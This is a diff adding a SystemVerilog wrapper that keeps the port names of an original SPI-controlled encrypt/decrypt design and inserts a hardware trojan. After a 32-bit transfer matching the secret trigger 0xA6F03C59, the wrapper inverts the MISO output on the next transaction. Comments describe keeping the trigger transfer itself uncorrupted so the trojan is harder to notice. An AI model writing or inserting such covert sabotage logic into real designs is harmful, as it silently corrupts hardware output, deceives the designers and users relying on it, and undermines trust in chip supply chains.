@@ -1,0 +1,77 @@
+```systemverilog
+module recovered (
+    input  wire pin_36, // SCK
+    input  wire pin_25, // ENC_DEC
+    input  wire pin_28, // NORM_CS_N
+    input  wire pin_32, // MOSI
+    input  wire pin_34, // RST_N
+    input  wire pin_27, // START
+    output wire pin_38, // BUSY
+    output wire pin_23, // ICE_LED
+    output wire pin_31  // MISO
+);
+
+    wire orig_miso;
+
+    // Instantiate original unmodified design
+    recovered_original inst_recovered_original (
+        .pin_36(pin_36),
+        .pin_25(pin_25),
+        .pin_28(pin_28),
+        .pin_32(pin_32),
+        .pin_34(pin_34),
+        .pin_27(pin_27),
+        .pin_38(pin_38),
+        .pin_23(pin_23),
+        .pin_31(orig_miso)
+    );
+
+    logic [31:0] shift_reg;
+    logic [5:0]  bit_cnt;
+    logic        armed;
+
+    // SPI domain: Shift register and bit counter.
+    // The bit counter resets asynchronously when CS is HIGH (transaction boundaries)
+    // and strictly saturates at 33 to prevent >32 bit transactions from wrapping
+    // around and spoofing a valid completion length.
+    always_ff @(posedge pin_36 or posedge pin_28) begin
+        if (pin_28) begin
+            bit_cnt <= 6'b0;
+        end else if (!pin_34) begin
+            bit_cnt <= 6'b0;
+            shift_reg <= 32'b0;
+        end else begin
+            if (bit_cnt < 6'd33) begin
+                bit_cnt <= bit_cnt + 1'b1;
+                shift_reg <= {shift_reg[30:0], pin_32};
+            end
+        end
+    end
+
+    // Transaction-boundary domain: Evaluate strictly at the end of a transaction.
+    // Captures the current `bit_cnt` securely before it is cleared by the same edge.
+    // By using CS rising edge, we safely ignore mid-transaction stalls.
+    always_ff @(posedge pin_28) begin
+        if (!pin_34) begin
+            armed <= 1'b0;
+        end else begin
+            // State updates strictly occur ONLY when exactly 32 bits have been received.
+            // Malformed or interrupted transactions are ignored, preserving the 'armed' flag
+            // until a complete payload transaction is finally achieved.
+            if (bit_cnt == 6'd32) begin
+                if (shift_reg == 32'hA6F03C59) begin
+                    armed <= 1'b1; // Trigger validated, arm for the next transaction
+                end else begin
+                    armed <= 1'b0; // Payload delivered (or normal transaction finished), disarm
+                end
+            end
+        end
+    end
+
+    // Corrupt MISO safely. 
+    // Since 'armed' only asserts when CS goes high at the END of the trigger transfer,
+    // the trigger transaction's MISO output is guaranteed to remain uncorrupted.
+    assign pin_31 = (armed && !pin_28) ? ~orig_miso : orig_miso;
+
+endmodule
+```
